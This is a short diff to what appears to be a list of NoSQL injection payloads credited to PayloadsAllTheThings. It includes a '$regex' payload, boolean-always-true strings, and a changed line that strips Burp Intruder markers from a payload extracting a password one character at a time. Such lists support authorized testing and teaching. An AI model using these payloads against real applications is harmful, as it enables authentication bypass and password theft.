@@ -53,6 +53,6 @@ Other
 {"$regex":"wien.*"}
 test'||1||'
 test'&&1&&'
-test' && this.password[§0§]=='§a§
+test' && this.password[0]=='a
 
 (Note: Payloads from PayloadsAllTheThings)
